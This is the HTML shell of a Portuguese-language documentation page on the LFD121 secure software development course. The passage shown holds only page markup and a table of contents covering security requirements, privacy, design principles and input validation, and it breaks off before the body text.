<!DOCTYPE html><html class=no-js lang=en> <head><meta charset=utf-8><meta content="width=device-width,initial-scale=1" name=viewport><meta content="Documentação 60pportunities" name=description><meta content="Horacio Vasconcellos" name=author><link href=https://60pportunities.com.br/Desenvolvimento%20de%20Software%20Seguro/LFD121/ rel=canonical><link href=../../img/favicon.ico rel=icon><meta content="mkdocs-1.6.1, mkdocs-material-9.6.11" name=generator><title>LFD121 - 60portunities</title><link href=../../assets/stylesheets/main.4af4bdda.min.css rel=stylesheet><link href=../../assets/stylesheets/palette.06af60db.min.css rel=stylesheet><link crossorigin href=https://fonts.gstatic.com rel=preconnect><link href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback" rel=stylesheet><style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style><link href=../../css/timeago.css rel=stylesheet><link href=../../styles/app-theme.css rel=stylesheet><link href=https://unpkg.com/mermaid@8.5.1/dist/mermaid.css rel=stylesheet><link href=../../styles/tablesort.css rel=stylesheet><link href=../../styles/60pthemas.css rel=stylesheet><script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><script id=__analytics>function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-horacio"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-horacio",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-horacio",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script><script>if("undefined"!=typeof __md_analytics){var consent=__md_get("__consent");consent&&consent.analytics&&__md_analytics()}</script><link href=../../assets/stylesheets/glightbox.min.css rel=stylesheet><style>
    html.glightbox-open { overflow: initial; height: 100%; }
    .gslide-title { margin-top: 0px; user-select: text; }
    .gslide-desc { color: #666; user-select: text; }
    .gslide-image img { background: white; }
    .gscrollbar-fixer { padding-right: 15px; }
    .gdesc-inner { font-size: 0.75rem; }
    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style><script src=../../assets/javascripts/glightbox.min.js></script></head> <body data-md-color-accent=purple data-md-color-primary=deep-purple data-md-color-scheme=default dir=ltr> <input autocomplete=off class=md-toggle data-md-toggle=drawer id=__drawer type=checkbox> <input autocomplete=off class=md-toggle data-md-toggle=search id=__search type=checkbox> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a class=md-skip href=#visao-geral-do-curso-objetivos-de-aprendizagem-e-cronograma> Skip to content </a> </div> <div data-md-component=announce> </div> <div data-md-color-scheme=default data-md-component=outdated hidden> </div> <header class="md-header md-header--shadow" data-md-component=header> <nav aria-label=Header class="md-header__inner md-grid"> <a aria-label=60portunities class="md-header__button md-logo" data-md-component=logo href=../.. title=60portunities> <svg viewbox="0 0 24 24" xmlns=http://www.w3.org/2000/svg><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg viewbox="0 0 24 24" xmlns=http://www.w3.org/2000/svg><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> 60portunities </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> LFD121 </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input aria-label="Azul da cor do mar" class=md-option data-md-color-accent=purple data-md-color-media="(prefers-color-scheme: light)" data-md-color-primary=deep-purple data-md-color-scheme=default id=__palette_0 name=__palette type=radio> <label class="md-header__button md-icon" for=__palette_1 hidden title="Azul da cor do mar"> <svg viewbox="0 0 24 24" xmlns=http://www.w3.org/2000/svg><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"></path></svg> </label> <input aria-label="Rock and Roll" class=md-option data-md-color-accent=deep-purple data-md-color-media="(prefers-color-scheme: dark)" data-md-color-primary=red data-md-color-scheme=default id=__palette_1 name=__palette type=radio> <label class="md-header__button md-icon" for=__palette_0 hidden title="Rock and Roll"> <svg viewbox="0 0 24 24" xmlns=http://www.w3.org/2000/svg><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"></path></svg> </label> </form> <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script> <label class="md-header__button md-icon" for=__search> <svg viewbox="0 0 24 24" xmlns=http://www.w3.org/2000/svg><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input aria-label=Search autocapitalize=off autocomplete=off autocorrect=off class=md-search__input data-md-component=search-query name=query placeholder=Search required spellcheck=false type=text> <label class="md-search__icon md-icon" for=__search> <svg viewbox="0 0 24 24" xmlns=http://www.w3.org/2000/svg><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg> <svg viewbox="0 0 24 24" xmlns=http://www.w3.org/2000/svg><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg> </label> <nav aria-label=Search class=md-search__options> <a aria-label=Share class="md-search__icon md-icon" data-clipboard data-clipboard-text data-md-component=search-share href=javascript:void(0) tabindex=-1 title=Share> <svg viewbox="0 0 24 24" xmlns=http://www.w3.org/2000/svg><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"></path></svg> </a> <button aria-label=Clear class="md-search__icon md-icon" tabindex=-1 title=Clear type=reset> <svg viewbox="0 0 24 24" xmlns=http://www.w3.org/2000/svg><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix tabindex=0> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list role=presentation></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a class=md-source data-md-component=source href=https://github.com/60pportunities/ title="Go to repository"> <div class="md-source__icon md-icon"> <svg viewbox="0 0 448 512" xmlns=http://www.w3.org/2000/svg><!-- Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"></path></svg> </div> <div class=md-source__repository> documentacao </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav aria-label=Navigation class="md-nav md-nav--primary" data-md-level=0> <label class=md-nav__title for=__drawer> <a aria-label=60portunities class="md-nav__button md-logo" data-md-component=logo href=../.. title=60portunities> <svg viewbox="0 0 24 24" xmlns=http://www.w3.org/2000/svg><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg> </a> 60portunities </label> <div class=md-nav__source> <a class=md-source data-md-component=source href=https://github.com/60pportunities/ title="Go to repository"> <div class="md-source__icon md-icon"> <svg viewbox="0 0 448 512" xmlns=http://www.w3.org/2000/svg><!-- Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"></path></svg> </div> <div class=md-source__repository> documentacao </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a class=md-nav__link href=../..> <span class=md-ellipsis> Inicio </span> </a> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav aria-label="Table of contents" class="md-nav md-nav--secondary"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a class=md-nav__link href=#visao-geral-do-curso-objetivos-de-aprendizagem-e-cronograma> <span class=md-ellipsis> Visão geral do curso, objetivos de aprendizagem e cronograma </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#parte-1-introducao-e-objetivos-de-aprendizagem> <span class=md-ellipsis> Parte 1 Introdução e Objetivos de Aprendizagem </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#o-que-significa-seguranca> <span class=md-ellipsis> O que significa "segurança"? </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#requisitos-de-seguranca> <span class=md-ellipsis> Requisitos de segurança </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#objetivos-de-seguranca-comuns> <span class=md-ellipsis> Objetivos de Segurança Comuns </span> </a> <nav aria-label="Objetivos de Segurança Comuns" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#confidencialidade-ler-sem-autorizacao> <span class=md-ellipsis> Confidencialidade ("Ler sem autorização") </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#integridade-sem-modificacoes-nao-autorizadas> <span class=md-ellipsis> Integridade ("Sem modificações não autorizadas") </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#disponibilidade-continua-funcionando-na-presenca-de-ataque> <span class=md-ellipsis> Disponibilidade ("Continua funcionando na presença de ataque") </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#nao-repudio-provar-que-alguem-fez-algo> <span class=md-ellipsis> Não-repúdio ("Provar que alguém fez algo") </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#identidade-e-autenticacao-ia> <span class=md-ellipsis> Identidade e autenticação (I&amp;A) </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#autorizacao> <span class=md-ellipsis> Autorização </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#auditoriaregistro> <span class=md-ellipsis> Auditoria/Registro </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#dicas-para-encontrar-requisitos-de-seguranca> <span class=md-ellipsis> Dicas para encontrar requisitos de segurança </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#termos-chave-confianca-confiavel-e-nao-confiavel> <span class=md-ellipsis> Termos-chave: Confiança, Confiável e Não Confiável </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#o-que-e-privacidade-e-por-que-ela-e-importante> <span class=md-ellipsis> O que é privacidade e por que ela é importante? </span> </a> <nav aria-label="O que é privacidade e por que ela é importante?" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#o-que-significa-privacidade> <span class=md-ellipsis> O que significa privacidade? </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#por-que-a-privacidade-e-importante> <span class=md-ellipsis> Por que a privacidade é importante? </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#requisitos-de-privacidade-abordagem-mais-simples-nao-colete-informacoes-pessoais> <span class=md-ellipsis> Requisitos de privacidade: abordagem mais simples - não colete informações pessoais </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#requisitos-de-privacidade-leis-e-regulamentos-de-privacidade> <span class=md-ellipsis> Requisitos de privacidade: leis e regulamentos de privacidade </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#requisitos-de-privacidade-estados-unidos> <span class=md-ellipsis> Requisitos de privacidade: Estados Unidos </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#requisitos-de-privacidade-regulamento-geral-europeu-de-protecao-de-dados-gdpr-i> <span class=md-ellipsis> Requisitos de privacidade: Regulamento Geral Europeu de Proteção de Dados (GDPR) I </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#requisitos-de-privacidade-regulamento-geral-europeu-de-protecao-de-dados-gdpr-ii> <span class=md-ellipsis> Requisitos de privacidade: Regulamento Geral Europeu de Proteção de Dados (GDPR) II </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#requisitos-de-privacidade-telemetria> <span class=md-ellipsis> Requisitos de privacidade: Telemetria </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#a-necessidade-de-gestao-de-riscos> <span class=md-ellipsis> A necessidade de gestão de riscos </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#processo-de-gestao-de-riscos> <span class=md-ellipsis> Processo de Gestão de Riscos </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#identificando-riscos> <span class=md-ellipsis> Identificando Riscos </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#seguranca-e-um-processo-nao-um-produto> <span class=md-ellipsis> Segurança é um processo, não um produto </span> </a> <nav aria-label="Segurança é um processo, não um produto" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#listas-de-verificacao-nao-sao-seguranca> <span class=md-ellipsis> Listas de verificação não são segurança </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#processos-de-desenvolvimentodefesa-em-amplitude-processos-individuais-de-desenvolvimento-e-implantacao-de-software> <span class=md-ellipsis> Processos de desenvolvimento/defesa em amplitude: processos individuais de desenvolvimento e implantação de software </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#processos-de-desenvolvimentodefesa-em-amplitude-usando-esses-processos-juntos> <span class=md-ellipsis> Processos de Desenvolvimento/Defesa em Amplitude: Usando Esses Processos Juntos </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#proteger-detectar-responder> <span class=md-ellipsis> Proteger, Detectar, Responder </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#vulnerabilidades> <span class=md-ellipsis> Vulnerabilidades </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#relatando-e-lidando-com-vulnerabilidades-um-breve-resumo> <span class=md-ellipsis> Relatando e lidando com vulnerabilidades: um breve resumo </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#vulnerabilidades-e-exposicoes-comuns-cves> <span class=md-ellipsis> Vulnerabilidades e Exposições Comuns (CVEs) </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#principais-tipos-de-vulnerabilidades> <span class=md-ellipsis> Principais tipos de vulnerabilidades </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#valor-de-conhecer-os-principais-tipos-de-vulnerabilidades> <span class=md-ellipsis> Valor de conhecer os principais tipos de vulnerabilidades </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#o-que-sao-principios-de-design-de-seguranca> <span class=md-ellipsis> O que são princípios de design de segurança? </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#principios-de-design-seguro-amplamente-recomendados> <span class=md-ellipsis> Princípios de design seguro amplamente recomendados </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#privilegio-minimo-maneiras-de-implementar-o-privilegio-minimo> <span class=md-ellipsis> Privilégio Mínimo: Maneiras de Implementar o Privilégio Mínimo </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#exemplos-de-privilegio-minimo> <span class=md-ellipsis> Exemplos de privilégio mínimo </span> </a> <nav aria-label="Exemplos de privilégio mínimo" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#mediacao-completa-nao-evitabilidade> <span class=md-ellipsis> Mediação Completa (Não-Evitabilidade) </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#design-inseguro-validacao-de-entrada-html-do-lado-do-cliente> <span class=md-ellipsis> Design Inseguro: Validação de Entrada HTML do Lado do Cliente </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#design-inseguro-validacao-de-entrada-javascriptwasm-do-lado-do-cliente> <span class=md-ellipsis> Design Inseguro: Validação de Entrada JavaScript/WASM do Lado do Cliente </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#design-seguro-validacao-de-entrada-em-um-ambiente-confiavel> <span class=md-ellipsis> Design Seguro: Validação de Entrada em um Ambiente Confiável </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#design-inseguro-aplicativo-movel-com-verificacao-do-lado-do-cliente> <span class=md-ellipsis> Design Inseguro: Aplicativo Móvel com Verificação do Lado do Cliente </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#design-inseguro-aplicativo-cliente-dependendo-de-um-servidor-nao-confiavel> <span class=md-ellipsis> Design inseguro: aplicativo cliente dependendo de um servidor não confiável </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#a-chave-execute-codigo-confiavel-em-um-ambiente-confiavel> <span class=md-ellipsis> A chave: execute código confiável em um ambiente confiável </span> </a> <nav aria-label="A chave: execute código confiável em um ambiente confiável" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#sinais-de-alerta> <span class=md-ellipsis> Sinais de alerta </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#tentando-executar-software-confiavel-em-ambientes-nao-confiaveis> <span class=md-ellipsis> Tentando executar software confiável em ambientes não confiáveis </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#o-restante-dos-principios-de-design-de-saltzer-e-schroeder> <span class=md-ellipsis> O restante dos princípios de design de Saltzer e Schroeder </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#outros-principios-de-design-cuidado-com-as-condicoes-de-corrida> <span class=md-ellipsis> Outros princípios de design: cuidado com as condições de corrida </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#outros-principios-de-design-cont> <span class=md-ellipsis> Outros princípios de design (cont.) </span> </a> <nav aria-label="Outros princípios de design (cont.)" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#fortalecer-o-sistema> <span class=md-ellipsis> Fortalecer o sistema </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#mantenha-os-segredos-em-segredo> <span class=md-ellipsis> Mantenha os segredos em segredo </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#confie-apenas-em-canais-confiaveis> <span class=md-ellipsis> Confie apenas em canais confiáveis </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#separar-dados-do-controle> <span class=md-ellipsis> Separar dados do controle </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#nocoes-basicas-de-reutilizacao-de-software> <span class=md-ellipsis> Noções básicas de reutilização de software </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#selecionando-avaliando-software-de-codigo-aberto> <span class=md-ellipsis> Selecionando (Avaliando) Software de Código Aberto </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#baixando-e-instalando-software-reutilizavel> <span class=md-ellipsis> Baixando e instalando software reutilizável </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#atualizando-componentes-de-software-reutilizados> <span class=md-ellipsis> Atualizando componentes de software reutilizados </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#atualizando-como-voce-usa-software-reutilizado-evitesubstitua-interfaces-obsoletas> <span class=md-ellipsis> Atualizando como você usa software reutilizado (evite/substitua interfaces obsoletas) </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#implementacao-da-validacao-de-entrada> <span class=md-ellipsis> Implementação da Validação de Entrada </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#introducao-aos-principios-basicos-de-validacao-de-entrada> <span class=md-ellipsis> Introdução aos princípios básicos de validação de entrada </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#como-voce-valida-a-entrada> <span class=md-ellipsis> Como você valida a entrada? </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#validacao-de-entrada-alguns-tipos-de-dados-simples> <span class=md-ellipsis> Validação de entrada: alguns tipos de dados simples </span> </a> <nav aria-label="Validação de entrada: alguns tipos de dados simples" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#numeros> <span class=md-ellipsis> Números </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#formatos-de-texto-especiais-conhecidos> <span class=md-ellipsis> Formatos de texto especiais conhecidos </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#sidequest-texto-unicode-e-localidades> <span class=md-ellipsis> Sidequest: Texto, Unicode e Localidades </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#pontos-de-codigo-e-codificacao> <span class=md-ellipsis> Pontos de código e codificação </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#locais> <span class=md-ellipsis> Locais </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#equivalencia-unicode> <span class=md-ellipsis> Equivalência Unicode </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#falsificacao-visual> <span class=md-ellipsis> Falsificação visual </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#validando-texto> <span class=md-ellipsis> Validando Texto </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#introducao-as-expressoes-regulares> <span class=md-ellipsis> Introdução às Expressões Regulares </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#usando-expressoes-regulares-para-validacao-de-entrada-de-texto> <span class=md-ellipsis> Usando expressões regulares para validação de entrada de texto </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#prioridade-de-filial> <span class=md-ellipsis> Prioridade de Filial </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#validadores-de-entrada-de-teste> <span class=md-ellipsis> Validadores de entrada de teste </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#combatendo-ataques-redos-em-expressoes-regulares-i> <span class=md-ellipsis> Combatendo ataques ReDoS em expressões regulares I </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#combatendo-ataques-redos-em-expressoes-regulares-ii> <span class=md-ellipsis> Combatendo ataques ReDoS em expressões regulares II </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#desserializacao-insegura> <span class=md-ellipsis> Desserialização Insegura </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#estruturas-de-dados-de-entrada-xml> <span class=md-ellipsis> Estruturas de dados de entrada: XML </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#estruturas-de-dados-de-entrada-html> <span class=md-ellipsis> Estruturas de dados de entrada: HTML </span> </a> <nav aria-label="Estruturas de dados de entrada: HTML" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#estruturas-de-dados-de-entrada-csv> <span class=md-ellipsis> Estruturas de dados de entrada: CSV </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#estruturas-de-dados-de-entrada-json> <span class=md-ellipsis> Estruturas de dados de entrada: JSON </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#estruturas-de-dados-de-entrada-uploads-de-arquivos> <span class=md-ellipsis> Estruturas de dados de entrada: uploads de arquivos </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a class=md-nav__link href=#minimizando-a-superficie-de-ataque-identificacao-autenticacao-e-autorizacao> <span class=md-ellipsis> Minimizando a superfície de ataque, identificação, autenticação e autorização </span> </a> </li> <li class=md-nav__item> <a class=md-nav__link href=#caminhos-de-pesquisa-e-variaveis-de-ambiente-incluindo-programas-setuidsetgid> <span class=md-ellipsis> Caminhos de pesquisa e variáveis ​​de ambiente (incluindo programas setuid/setgid) </span> </a> <nav aria-label="Caminhos de pesquisa e variáveis ​​de ambiente (incluindo programas setuid/setgid)" class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <a class=md-nav__link href=#entradas-especiais-padroes-seguros-e-inicializacao-segura> 